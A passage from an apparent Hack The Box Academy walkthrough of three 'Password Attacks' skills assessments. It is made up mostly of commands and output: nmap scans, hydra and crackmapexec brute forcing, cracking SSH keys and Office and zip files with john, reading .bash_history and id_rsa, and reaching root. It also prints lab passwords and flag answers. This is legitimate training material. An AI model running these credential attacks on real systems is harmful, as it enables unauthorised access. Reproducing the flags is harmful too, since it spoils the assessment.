<span class="normal"><a href="#__codelineno-198-36">36</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-198-1"><a id="__codelineno-198-1" name="__codelineno-198-1"></a><span class="c"># Enumerate services</span>
</span><span id="__span-198-2"><a id="__codelineno-198-2" name="__codelineno-198-2"></a><span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sC</span> <span class="n">-sV</span>  <span class="nv">$ip</span> <span class="n">-Pn</span> 
</span><span id="__span-198-3"><a id="__codelineno-198-3" name="__codelineno-198-3"></a><span class="c"># Output: port 21 and 22</span>
</span><span id="__span-198-4"><a id="__codelineno-198-4" name="__codelineno-198-4"></a>
</span><span id="__span-198-5"><a id="__codelineno-198-5" name="__codelineno-198-5"></a><span class="c"># Download the resources files with userlist and password list and generated a mutated list:</span>
</span><span id="__span-198-6"><a id="__codelineno-198-6" name="__codelineno-198-6"></a><span class="n">hashcat</span> <span class="p">-</span><span class="n">-force</span> <span class="n">password</span><span class="p">.</span><span class="n">list</span> <span class="n">-r</span> <span class="n">custom</span><span class="p">.</span><span class="n">rule</span> <span class="p">-</span><span class="n">-stdout</span> <span class="p">|</span> <span class="nb">sort </span><span class="n">-u</span> <span class="p">&gt;</span> <span class="n">mutatedlist</span><span class="p">.</span><span class="n">list</span>
</span><span id="__span-198-7"><a id="__codelineno-198-7" name="__codelineno-198-7"></a>
</span><span id="__span-198-8"><a id="__codelineno-198-8" name="__codelineno-198-8"></a><span class="c"># Launch a password attack with the username.list and password.list resource provided</span>
</span><span id="__span-198-9"><a id="__codelineno-198-9" name="__codelineno-198-9"></a><span class="n">hydra</span> <span class="n">-L</span> <span class="n">username</span><span class="p">.</span><span class="n">list</span> <span class="n">-P</span> <span class="n">password</span><span class="p">.</span><span class="n">list</span> <span class="n">ftp</span><span class="p">://</span><span class="nv">$ip</span>
</span><span id="__span-198-10"><a id="__codelineno-198-10" name="__codelineno-198-10"></a><span class="c"># output: [21][ftp] host: $ip  login: mike   password: 7777777</span>
</span><span id="__span-198-11"><a id="__codelineno-198-11" name="__codelineno-198-11"></a>
</span><span id="__span-198-12"><a id="__codelineno-198-12" name="__codelineno-198-12"></a><span class="c"># Now we access the ftp service with the creds</span>
</span><span id="__span-198-13"><a id="__codelineno-198-13" name="__codelineno-198-13"></a><span class="n">ftp</span> <span class="nv">$ip</span>
</span><span id="__span-198-14"><a id="__codelineno-198-14" name="__codelineno-198-14"></a><span class="c"># Enter user mike</span>
</span><span id="__span-198-15"><a id="__codelineno-198-15" name="__codelineno-198-15"></a><span class="c"># Enter password 7777777</span>
</span><span id="__span-198-16"><a id="__codelineno-198-16" name="__codelineno-198-16"></a>
</span><span id="__span-198-17"><a id="__codelineno-198-17" name="__codelineno-198-17"></a><span class="c"># From the ftp terminal:</span>
</span><span id="__span-198-18"><a id="__codelineno-198-18" name="__codelineno-198-18"></a><span class="nb">dir</span>
</span><span id="__span-198-19"><a id="__codelineno-198-19" name="__codelineno-198-19"></a><span class="c"># We will see some ssh keys. Download the id_rsa</span>
</span><span id="__span-198-20"><a id="__codelineno-198-20" name="__codelineno-198-20"></a><span class="n">get</span> <span class="n">id_rsa</span>
</span><span id="__span-198-21"><a id="__codelineno-198-21" name="__codelineno-198-21"></a><span class="n">quit</span>
</span><span id="__span-198-22"><a id="__codelineno-198-22" name="__codelineno-198-22"></a>
</span><span id="__span-198-23"><a id="__codelineno-198-23" name="__codelineno-198-23"></a><span class="c"># Now we crack the ssh id_rsa key</span>
</span><span id="__span-198-24"><a id="__codelineno-198-24" name="__codelineno-198-24"></a><span class="n">ssh2john</span><span class="p">.</span><span class="n">py</span> <span class="n">id_rsa</span> <span class="p">&gt;</span> <span class="n">ssh</span><span class="p">.</span><span class="n">hash</span>
</span><span id="__span-198-25"><a id="__codelineno-198-25" name="__codelineno-198-25"></a><span class="n">john</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="n">ssh</span><span class="p">.</span><span class="n">hash</span>
</span><span id="__span-198-26"><a id="__codelineno-198-26" name="__codelineno-198-26"></a><span class="c"># output: 7777777</span>
</span><span id="__span-198-27"><a id="__codelineno-198-27" name="__codelineno-198-27"></a>
</span><span id="__span-198-28"><a id="__codelineno-198-28" name="__codelineno-198-28"></a><span class="c"># And connect via ssh </span>
</span><span id="__span-198-29"><a id="__codelineno-198-29" name="__codelineno-198-29"></a><span class="n">chmod</span> <span class="n">600</span> <span class="n">id_rsa</span>
</span><span id="__span-198-30"><a id="__codelineno-198-30" name="__codelineno-198-30"></a><span class="n">ssh</span> <span class="n">-i</span> <span class="n">id_rsa</span> <span class="n">mike</span><span class="p">@</span><span class="nv">$ip</span>
</span><span id="__span-198-31"><a id="__codelineno-198-31" name="__codelineno-198-31"></a><span class="c"># Enter password for key: 7777777</span>
</span><span id="__span-198-32"><a id="__codelineno-198-32" name="__codelineno-198-32"></a>
</span><span id="__span-198-33"><a id="__codelineno-198-33" name="__codelineno-198-33"></a><span class="c"># We have accessed the machine as mike. After browsing around we notice the .bash_history file. </span>
</span><span id="__span-198-34"><a id="__codelineno-198-34" name="__codelineno-198-34"></a><span class="nb">cat </span><span class="p">.</span><span class="n">bash_history</span>
</span><span id="__span-198-35"><a id="__codelineno-198-35" name="__codelineno-198-35"></a>
</span><span id="__span-198-36"><a id="__codelineno-198-36" name="__codelineno-198-36"></a><span class="c"># The root password is logged in plain text</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: dgb6fzm0ynk@AME9pqu</p>
<h3 id="skills-assessment-2-password-attack-medium">Skills Assessment 2: Password Attack Medium</h3>
<p>Our next host is a workstation used by an employee for their day-to-day work. These types of hosts are often used to exchange files with other employees and are typically administered by administrators over the network. During a meeting with the client, we were informed that many internal users use this host as a jump host. The focus is on securing and protecting files containing sensitive information.</p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-199-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-199-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-199-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-199-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-199-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-199-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-199-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-199-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-199-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-199-10">10</a></span>
<span class="normal"><a href="#__codelineno-199-11">11</a></span>
<span class="normal"><a href="#__codelineno-199-12">12</a></span>
<span class="normal"><a href="#__codelineno-199-13">13</a></span>
<span class="normal"><a href="#__codelineno-199-14">14</a></span>
<span class="normal"><a href="#__codelineno-199-15">15</a></span>
<span class="normal"><a href="#__codelineno-199-16">16</a></span>
<span class="normal"><a href="#__codelineno-199-17">17</a></span>
<span class="normal"><a href="#__codelineno-199-18">18</a></span>
<span class="normal"><a href="#__codelineno-199-19">19</a></span>
<span class="normal"><a href="#__codelineno-199-20">20</a></span>
<span class="normal"><a href="#__codelineno-199-21">21</a></span>
<span class="normal"><a href="#__codelineno-199-22">22</a></span>
<span class="normal"><a href="#__codelineno-199-23">23</a></span>
<span class="normal"><a href="#__codelineno-199-24">24</a></span>
<span class="normal"><a href="#__codelineno-199-25">25</a></span>
<span class="normal"><a href="#__codelineno-199-26">26</a></span>
<span class="normal"><a href="#__codelineno-199-27">27</a></span>
<span class="normal"><a href="#__codelineno-199-28">28</a></span>
<span class="normal"><a href="#__codelineno-199-29">29</a></span>
<span class="normal"><a href="#__codelineno-199-30">30</a></span>
<span class="normal"><a href="#__codelineno-199-31">31</a></span>
<span class="normal"><a href="#__codelineno-199-32">32</a></span>
<span class="normal"><a href="#__codelineno-199-33">33</a></span>
<span class="normal"><a href="#__codelineno-199-34">34</a></span>
<span class="normal"><a href="#__codelineno-199-35">35</a></span>
<span class="normal"><a href="#__codelineno-199-36">36</a></span>
<span class="normal"><a href="#__codelineno-199-37">37</a></span>
<span class="normal"><a href="#__codelineno-199-38">38</a></span>
<span class="normal"><a href="#__codelineno-199-39">39</a></span>
<span class="normal"><a href="#__codelineno-199-40">40</a></span>
<span class="normal"><a href="#__codelineno-199-41">41</a></span>
<span class="normal"><a href="#__codelineno-199-42">42</a></span>
<span class="normal"><a href="#__codelineno-199-43">43</a></span>
<span class="normal"><a href="#__codelineno-199-44">44</a></span>
<span class="normal"><a href="#__codelineno-199-45">45</a></span>
<span class="normal"><a href="#__codelineno-199-46">46</a></span>
<span class="normal"><a href="#__codelineno-199-47">47</a></span>
<span class="normal"><a href="#__codelineno-199-48">48</a></span>
<span class="normal"><a href="#__codelineno-199-49">49</a></span>
<span class="normal"><a href="#__codelineno-199-50">50</a></span>
<span class="normal"><a href="#__codelineno-199-51">51</a></span>
<span class="normal"><a href="#__codelineno-199-52">52</a></span>
<span class="normal"><a href="#__codelineno-199-53">53</a></span>
<span class="normal"><a href="#__codelineno-199-54">54</a></span>
<span class="normal"><a href="#__codelineno-199-55">55</a></span>
<span class="normal"><a href="#__codelineno-199-56">56</a></span>
<span class="normal"><a href="#__codelineno-199-57">57</a></span>
<span class="normal"><a href="#__codelineno-199-58">58</a></span>
<span class="normal"><a href="#__codelineno-199-59">59</a></span>
<span class="normal"><a href="#__codelineno-199-60">60</a></span>
<span class="normal"><a href="#__codelineno-199-61">61</a></span>
<span class="normal"><a href="#__codelineno-199-62">62</a></span>
<span class="normal"><a href="#__codelineno-199-63">63</a></span>
<span class="normal"><a href="#__codelineno-199-64">64</a></span>
<span class="normal"><a href="#__codelineno-199-65">65</a></span>
<span class="normal"><a href="#__codelineno-199-66">66</a></span>
<span class="normal"><a href="#__codelineno-199-67">67</a></span>
<span class="normal"><a href="#__codelineno-199-68">68</a></span>
<span class="normal"><a href="#__codelineno-199-69">69</a></span>
<span class="normal"><a href="#__codelineno-199-70">70</a></span>
<span class="normal"><a href="#__codelineno-199-71">71</a></span>
<span class="normal"><a href="#__codelineno-199-72">72</a></span>
<span class="normal"><a href="#__codelineno-199-73">73</a></span>
<span class="normal"><a href="#__codelineno-199-74">74</a></span>
<span class="normal"><a href="#__codelineno-199-75">75</a></span>
<span class="normal"><a href="#__codelineno-199-76">76</a></span>
<span class="normal"><a href="#__codelineno-199-77">77</a></span>
<span class="normal"><a href="#__codelineno-199-78">78</a></span>
<span class="normal"><a href="#__codelineno-199-79">79</a></span>
<span class="normal"><a href="#__codelineno-199-80">80</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-199-1"><a id="__codelineno-199-1" name="__codelineno-199-1"></a><span class="c"># Enumerate services</span>
</span><span id="__span-199-2"><a id="__codelineno-199-2" name="__codelineno-199-2"></a><span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sC</span> <span class="n">-sV</span> <span class="nv">$ip</span> <span class="n">-Pn</span>  
</span><span id="__span-199-3"><a id="__codelineno-199-3" name="__codelineno-199-3"></a><span class="c"># Output: open ports -&gt; 22, 139, 445</span>
</span><span id="__span-199-4"><a id="__codelineno-199-4" name="__codelineno-199-4"></a>
</span><span id="__span-199-5"><a id="__codelineno-199-5" name="__codelineno-199-5"></a><span class="c"># Download the resources provided by HTB. Unzip the file. And generated a mutated password list. </span>
</span><span id="__span-199-6"><a id="__codelineno-199-6" name="__codelineno-199-6"></a><span class="n">hashcat</span> <span class="p">-</span><span class="n">-force</span> <span class="n">password</span><span class="p">.</span><span class="n">list</span> <span class="n">-r</span> <span class="n">custom</span><span class="p">.</span><span class="n">rule</span> <span class="p">-</span><span class="n">-stdout</span> <span class="p">&gt;</span> <span class="n">mut_password</span><span class="p">.</span><span class="n">list</span>
</span><span id="__span-199-7"><a id="__codelineno-199-7" name="__codelineno-199-7"></a>
</span><span id="__span-199-8"><a id="__codelineno-199-8" name="__codelineno-199-8"></a><span class="c"># Use a password attack with cracmapexec and the smb service</span>
</span><span id="__span-199-9"><a id="__codelineno-199-9" name="__codelineno-199-9"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span> <span class="n">-u</span> <span class="n">username</span><span class="p">.</span><span class="n">list</span> <span class="n">-p</span> <span class="n">mut_password</span><span class="p">.</span><span class="n">list</span>
</span><span id="__span-199-10"><a id="__codelineno-199-10" name="__codelineno-199-10"></a><span class="c"># Output: SMB         10.129.153.184  445    SKILLS-MEDIUM    [+] \john:123456 </span>
</span><span id="__span-199-11"><a id="__codelineno-199-11" name="__codelineno-199-11"></a>
</span><span id="__span-199-12"><a id="__codelineno-199-12" name="__codelineno-199-12"></a><span class="c"># Enumerate samba services with user john</span>
</span><span id="__span-199-13"><a id="__codelineno-199-13" name="__codelineno-199-13"></a><span class="n">smbclient</span> <span class="n">-L</span> <span class="nv">$ip</span> <span class="n">-U</span> <span class="n">john</span>
</span><span id="__span-199-14"><a id="__codelineno-199-14" name="__codelineno-199-14"></a><span class="c"># Enter password: 123456</span>
</span><span id="__span-199-15"><a id="__codelineno-199-15" name="__codelineno-199-15"></a>
</span><span id="__span-199-16"><a id="__codelineno-199-16" name="__codelineno-199-16"></a><span class="c"># Access the service</span>
</span><span id="__span-199-17"><a id="__codelineno-199-17" name="__codelineno-199-17"></a><span class="n">smbclient</span> <span class="p">\\\\</span><span class="nv">$ip</span><span class="p">\\</span><span class="n">SHAREDRIVE</span> <span class="n">-U</span> <span class="n">john</span>
</span><span id="__span-199-18"><a id="__codelineno-199-18" name="__codelineno-199-18"></a><span class="c"># Enter password: 123456</span>
</span><span id="__span-199-19"><a id="__codelineno-199-19" name="__codelineno-199-19"></a>
</span><span id="__span-199-20"><a id="__codelineno-199-20" name="__codelineno-199-20"></a><span class="c"># Enumerate and download zip file</span>
</span><span id="__span-199-21"><a id="__codelineno-199-21" name="__codelineno-199-21"></a><span class="nb">dir</span>
</span><span id="__span-199-22"><a id="__codelineno-199-22" name="__codelineno-199-22"></a><span class="n">get</span> <span class="n">Docs</span><span class="p">.</span><span class="n">zip</span>
</span><span id="__span-199-23"><a id="__codelineno-199-23" name="__codelineno-199-23"></a><span class="n">quit</span>
</span><span id="__span-199-24"><a id="__codelineno-199-24" name="__codelineno-199-24"></a>
</span><span id="__span-199-25"><a id="__codelineno-199-25" name="__codelineno-199-25"></a><span class="c"># Now we will try to crack the zip file</span>
</span><span id="__span-199-26"><a id="__codelineno-199-26" name="__codelineno-199-26"></a><span class="n">zip2john</span> <span class="n">Docs</span><span class="p">.</span><span class="n">zip</span> <span class="p">&gt;</span> <span class="n">zip</span><span class="p">.</span><span class="n">hashes</span>
</span><span id="__span-199-27"><a id="__codelineno-199-27" name="__codelineno-199-27"></a><span class="n">john</span> <span class="n">zip</span><span class="p">.</span><span class="n">hashes</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=</span><span class="n">mut_password</span><span class="p">.</span><span class="n">list</span> 
</span><span id="__span-199-28"><a id="__codelineno-199-28" name="__codelineno-199-28"></a><span class="c"># Output: Destiny2022!</span>
</span><span id="__span-199-29"><a id="__codelineno-199-29" name="__codelineno-199-29"></a>
</span><span id="__span-199-30"><a id="__codelineno-199-30" name="__codelineno-199-30"></a><span class="c"># Unzip the file and read the content:</span>
</span><span id="__span-199-31"><a id="__codelineno-199-31" name="__codelineno-199-31"></a><span class="n">unzip</span> <span class="n">Docs</span><span class="p">.</span><span class="n">zip</span>
</span><span id="__span-199-32"><a id="__codelineno-199-32" name="__codelineno-199-32"></a><span class="c"># Enter password: Destiny2022!</span>
</span><span id="__span-199-33"><a id="__codelineno-199-33" name="__codelineno-199-33"></a>
</span><span id="__span-199-34"><a id="__codelineno-199-34" name="__codelineno-199-34"></a><span class="c"># The compressed file is a word document that requires a password to open it. We will try to crack it with office2john</span>
</span><span id="__span-199-35"><a id="__codelineno-199-35" name="__codelineno-199-35"></a><span class="n">office2john</span> <span class="n">Documentation</span><span class="p">.</span><span class="n">docx</span> <span class="p">&gt;</span> <span class="n">hash</span>
</span><span id="__span-199-36"><a id="__codelineno-199-36" name="__codelineno-199-36"></a><span class="n">john</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=</span><span class="n">mut_password</span><span class="p">.</span><span class="n">list</span> <span class="n">hash</span>
</span><span id="__span-199-37"><a id="__codelineno-199-37" name="__codelineno-199-37"></a><span class="c"># Output: 987654321        (Documentation.docx) </span>
</span><span id="__span-199-38"><a id="__codelineno-199-38" name="__codelineno-199-38"></a>
</span><span id="__span-199-39"><a id="__codelineno-199-39" name="__codelineno-199-39"></a><span class="c"># When we open the document, we have a installation manual with the hardcoded creds: </span>
</span><span id="__span-199-40"><a id="__codelineno-199-40" name="__codelineno-199-40"></a><span class="n">jason</span><span class="p">:</span><span class="n">C4mNKjAtL2dydsYa6</span>
</span><span id="__span-199-41"><a id="__codelineno-199-41" name="__codelineno-199-41"></a>
</span><span id="__span-199-42"><a id="__codelineno-199-42" name="__codelineno-199-42"></a><span class="c"># Access the target with jason&#39;s creds</span>
</span><span id="__span-199-43"><a id="__codelineno-199-43" name="__codelineno-199-43"></a><span class="n">ssh</span> <span class="n">jason</span><span class="p">@</span><span class="nv">$ip</span>
</span><span id="__span-199-44"><a id="__codelineno-199-44" name="__codelineno-199-44"></a><span class="c"># Enter password: C4mNKjAtL2dydsYa6</span>
</span><span id="__span-199-45"><a id="__codelineno-199-45" name="__codelineno-199-45"></a>
</span><span id="__span-199-46"><a id="__codelineno-199-46" name="__codelineno-199-46"></a><span class="c"># Check services running:</span>
</span><span id="__span-199-47"><a id="__codelineno-199-47" name="__codelineno-199-47"></a><span class="n">netstat</span> <span class="n">-antp</span>
</span><span id="__span-199-48"><a id="__codelineno-199-48" name="__codelineno-199-48"></a>
</span><span id="__span-199-49"><a id="__codelineno-199-49" name="__codelineno-199-49"></a><span class="c"># We can see that there is a mysql server listening locally. In our kali machine we use the Default-Credential utility to list default passwords for mysql service</span>
</span><span id="__span-199-50"><a id="__codelineno-199-50" name="__codelineno-199-50"></a><span class="n">creds</span> <span class="n">search</span> <span class="n">mysql</span>
</span><span id="__span-199-51"><a id="__codelineno-199-51" name="__codelineno-199-51"></a>
</span><span id="__span-199-52"><a id="__codelineno-199-52" name="__codelineno-199-52"></a><span class="c"># We access mysql with creds superdba:admin</span>
</span><span id="__span-199-53"><a id="__codelineno-199-53" name="__codelineno-199-53"></a><span class="n">mysql</span> <span class="n">-u</span> <span class="n">superdba</span> <span class="n">-padmin</span>
</span><span id="__span-199-54"><a id="__codelineno-199-54" name="__codelineno-199-54"></a>
</span><span id="__span-199-55"><a id="__codelineno-199-55" name="__codelineno-199-55"></a><span class="c"># Now we use mysql commands to enumerate</span>
</span><span id="__span-199-56"><a id="__codelineno-199-56" name="__codelineno-199-56"></a><span class="n">show</span> <span class="n">databases</span><span class="p">;</span>
</span><span id="__span-199-57"><a id="__codelineno-199-57" name="__codelineno-199-57"></a><span class="n">use</span> <span class="n">users</span><span class="p">;</span>
</span><span id="__span-199-58"><a id="__codelineno-199-58" name="__codelineno-199-58"></a><span class="n">show</span> <span class="n">tables</span><span class="p">;</span>
</span><span id="__span-199-59"><a id="__codelineno-199-59" name="__codelineno-199-59"></a><span class="nb">select </span><span class="p">*</span> <span class="n">from</span> <span class="n">creds</span><span class="p">;</span>
</span><span id="__span-199-60"><a id="__codelineno-199-60" name="__codelineno-199-60"></a><span class="c"># We can see creds for dennis:7AUgWWQEiMPdqx</span>
</span><span id="__span-199-61"><a id="__codelineno-199-61" name="__codelineno-199-61"></a>
</span><span id="__span-199-62"><a id="__codelineno-199-62" name="__codelineno-199-62"></a><span class="c"># We access dennis</span>
</span><span id="__span-199-63"><a id="__codelineno-199-63" name="__codelineno-199-63"></a><span class="n">su</span> <span class="n">dennis</span>
</span><span id="__span-199-64"><a id="__codelineno-199-64" name="__codelineno-199-64"></a><span class="c"># Enter password: 7AUgWWQEiMPdqx</span>
</span><span id="__span-199-65"><a id="__codelineno-199-65" name="__codelineno-199-65"></a>
</span><span id="__span-199-66"><a id="__codelineno-199-66" name="__codelineno-199-66"></a><span class="c"># We copy the /home/dennis/.ssh/id_rsa file</span>
</span><span id="__span-199-67"><a id="__codelineno-199-67" name="__codelineno-199-67"></a><span class="nb">cat </span><span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">dennis</span><span class="p">/.</span><span class="n">ssh</span><span class="p">/</span><span class="n">id_rsa</span> <span class="n">file</span>
</span><span id="__span-199-68"><a id="__codelineno-199-68" name="__codelineno-199-68"></a>
</span><span id="__span-199-69"><a id="__codelineno-199-69" name="__codelineno-199-69"></a><span class="c"># From our kali machine we copy the file to a local id_rsa file and crack it:</span>
</span><span id="__span-199-70"><a id="__codelineno-199-70" name="__codelineno-199-70"></a><span class="n">ssh2john</span> <span class="n">id_rsa</span> <span class="p">&gt;</span> <span class="n">ssh</span><span class="p">.</span><span class="n">hashes</span>
</span><span id="__span-199-71"><a id="__codelineno-199-71" name="__codelineno-199-71"></a><span class="n">john</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=</span><span class="n">mut_password</span><span class="p">.</span><span class="n">list</span> <span class="n">ssh</span><span class="p">.</span><span class="n">hashes</span> 
</span><span id="__span-199-72"><a id="__codelineno-199-72" name="__codelineno-199-72"></a><span class="c"># Output: P@ssw0rd12020!</span>
</span><span id="__span-199-73"><a id="__codelineno-199-73" name="__codelineno-199-73"></a>
</span><span id="__span-199-74"><a id="__codelineno-199-74" name="__codelineno-199-74"></a><span class="c"># Now we access the target ip with root</span>
</span><span id="__span-199-75"><a id="__codelineno-199-75" name="__codelineno-199-75"></a><span class="n">chmod</span> <span class="n">600</span> <span class="n">id_rsa</span>
</span><span id="__span-199-76"><a id="__codelineno-199-76" name="__codelineno-199-76"></a><span class="n">ssh</span> <span class="n">-i</span> <span class="n">id_rsa</span> <span class="n">root</span><span class="p">@</span><span class="nv">$ip</span>
</span><span id="__span-199-77"><a id="__codelineno-199-77" name="__codelineno-199-77"></a><span class="c"># Enter the password: P@ssw0rd12020!</span>
</span><span id="__span-199-78"><a id="__codelineno-199-78" name="__codelineno-199-78"></a>
</span><span id="__span-199-79"><a id="__codelineno-199-79" name="__codelineno-199-79"></a><span class="c"># We are root. Let&#39;s print the flag</span>
</span><span id="__span-199-80"><a id="__codelineno-199-80" name="__codelineno-199-80"></a><span class="nb">cat </span><span class="p">/</span><span class="n">root</span><span class="p">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{PeopleReuse_PWsEverywhere!}</p>
<h3 id="skills-assessment-3-password-attack-hard">Skills Assessment 3: Password Attack Hard</h3>
<p>The next host is a Windows-based client. As with the previous assessments, our client would like to make sure that an attacker cannot gain access to any sensitive files in the event of a successful attack. While our colleagues were busy with other hosts on the network, we found out that the user <code>Johanna</code> is present on many hosts. However, we have not yet been able to determine the exact purpose or reason for this.</p>
<p><strong>Examine the third target and submit the contents of flag.txt in C:\Users\Administrator\Desktop\ as the answer.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-200-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-200-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-200-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-200-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-200-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-200-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-200-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-200-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-200-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-200-10">10</a></span>
<span class="normal"><a href="#__codelineno-200-11">11</a></span>
<span class="normal"><a href="#__codelineno-200-12">12</a></span>
<span class="normal"><a href="#__codelineno-200-13">13</a></span>
<span class="normal"><a href="#__codelineno-200-14">14</a></span>
<span class="normal"><a href="#__codelineno-200-15">15</a></span>
<span class="normal"><a href="#__codelineno-200-16">16</a></span>
<span class="normal"><a href="#__codelineno-200-17">17</a></span>
<span class="normal"><a href="#__codelineno-200-18">18</a></span>
<span class="normal"><a href="#__codelineno-200-19">19</a></span>
<span class="normal"><a href="#__codelineno-200-20">20</a></span>
<span class="normal"><a href="#__codelineno-200-21">21</a></span>
<span class="normal"><a href="#__codelineno-200-22">22</a></span>
<span class="normal"><a href="#__codelineno-200-23">23</a></span>
<span class="normal"><a href="#__codelineno-200-24">24</a></span>
<span class="normal"><a href="#__codelineno-200-25">25</a></span>
<span class="normal"><a href="#__codelineno-200-26">26</a></span>
<span class="normal"><a href="#__codelineno-200-27">27</a></span>
<span class="normal"><a href="#__codelineno-200-28">28</a></span>
<span class="normal"><a href="#__codelineno-200-29">29</a></span>
<span class="normal"><a href="#__codelineno-200-30">30</a></span>
<span class="normal"><a href="#__codelineno-200-31">31</a></span>
<span class="normal"><a href="#__codelineno-200-32">32</a></span>
<span class="normal"><a href="#__codelineno-200-33">33</a></span>
<span class="normal"><a href="#__codelineno-200-34">34</a></span>
<span class="normal"><a href="#__codelineno-200-35">35</a></span>
<span class="normal"><a href="#__codelineno-200-36">36</a></span>
<span class="normal"><a href="#__codelineno-200-37">37</a></span>
<span class="normal"><a href="#__codelineno-200-38">38</a></span>
<span class="normal"><a href="#__codelineno-200-39">39</a></span>
<span class="normal"><a href="#__codelineno-200-40">40</a></span>
<span class="normal"><a href="#__codelineno-200-41">41</a></span>
<span class="normal"><a href="#__codelineno-200-42">42</a></span>
<span class="normal"><a href="#__codelineno-200-43">43</a></span>
<span class="normal"><a href="#__codelineno-200-44">44</a></span>
<span class="normal"><a href="#__codelineno-200-45">45</a></span>
<span class="normal"><a href="#__codelineno-200-46">46</a></span>
<span class="normal"><a href="#__codelineno-200-47">47</a></span>
<span class="normal"><a href="#__codelineno-200-48">48</a></span>
<span class="normal"><a href="#__codelineno-200-49">49</a></span>
<span class="normal"><a href="#__codelineno-200-50">50</a></span>
<span class="normal"><a href="#__codelineno-200-51">51</a></span>
<span class="normal"><a href="#__codelineno-200-52">52</a></span>
<span class="normal"><a href="#__codelineno-200-53">53</a></span>
<span class="normal"><a href="#__codelineno-200-54">54</a></span>
<span class="normal"><a href="#__codelineno-200-55">55</a></span>
<span class="normal"><a href="#__codelineno-200-56">56</a></span>
<span class="normal"><a href="#__codelineno-200-57">57</a></span>
<span class="normal"><a href="#__codelineno-200-58">58</a></span>
<span class="normal"><a href="#__codelineno-200-59">59</a></span>
<span class="normal"><a href="#__codelineno-200-60">60</a></span>
<span class="normal"><a href="#__codelineno-200-61">61</a></span>
<span class="normal"><a href="#__codelineno-200-62">62</a></span>
<span class="normal"><a href="#__codelineno-200-63">63</a></span>
<span class="normal"><a href="#__codelineno-200-64">64</a></span>
<span class="normal"><a href="#__codelineno-200-65">65</a></span>
<span class="normal"><a href="#__codelineno-200-66">66</a></span>
<span class="normal"><a href="#__codelineno-200-67">67</a></span>
<span class="normal"><a href="#__codelineno-200-68">68</a></span>
<span class="normal"><a href="#__codelineno-200-69">69</a></span>
<span class="normal"><a href="#__codelineno-200-70">70</a></span>
<span class="normal"><a href="#__codelineno-200-71">71</a></span>
<span class="normal"><a href="#__codelineno-200-72">72</a></span>
<span class="normal"><a href="#__codelineno-200-73">73</a></span>
<span class="normal"><a href="#__codelineno-200-74">74</a></span>
<span class="normal"><a href="#__codelineno-200-75">75</a></span>
<span class="normal"><a href="#__codelineno-200-76">76</a></span>
<span class="normal"><a href="#__codelineno-200-77">77</a></span>
<span class="normal"><a href="#__codelineno-200-78">78</a></span>
<span class="normal"><a href="#__codelineno-200-79">79</a></span>
<span class="normal"><a href="#__codelineno-200-80">80</a></span>
<span class="normal"><a href="#__codelineno-200-81">81</a></span>
<span class="normal"><a href="#__codelineno-200-82">82</a></span>
<span class="normal"><a href="#__codelineno-200-83">83</a></span>
<span class="normal"><a href="#__codelineno-200-84">84</a></span>
<span class="normal"><a href="#__codelineno-200-85">85</a></span>
<span class="normal"><a href="#__codelineno-200-86">86</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-200-1"><a id="__codelineno-200-1" name="__codelineno-200-1"></a><span class="c"># We enumerate services</span>
</span><span id="__span-200-2"><a id="__codelineno-200-2" name="__codelineno-200-2"></a><span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sC</span> <span class="n">-sV</span> <span class="nv">$ip</span> <span class="n">-Pn</span>
</span><span id="__span-200-3"><a id="__codelineno-200-3" name="__codelineno-200-3"></a><span class="c"># output: open ports -&gt; 11, 135, 139, 445, 2049, 3389, 5985</span>
</span><span id="__span-200-4"><a id="__codelineno-200-4" name="__codelineno-200-4"></a><span class="c"># hostname WINSRV</span>
</span><span id="__span-200-5"><a id="__codelineno-200-5" name="__codelineno-200-5"></a>
</span><span id="__span-200-6"><a id="__codelineno-200-6" name="__codelineno-200-6"></a><span class="c"># Download the resources provided by HTB. Unzip the file. And generated a mutated password list. </span>
</span><span id="__span-200-7"><a id="__codelineno-200-7" name="__codelineno-200-7"></a><span class="n">hashcat</span> <span class="p">-</span><span class="n">-force</span> <span class="n">password</span><span class="p">.</span><span class="n">list</span> <span class="n">-r</span> <span class="n">custom</span><span class="p">.</span><span class="n">rule</span> <span class="p">-</span><span class="n">-stdout</span> <span class="p">&gt;</span> <span class="n">mut_password</span><span class="p">.</span><span class="n">list</span>
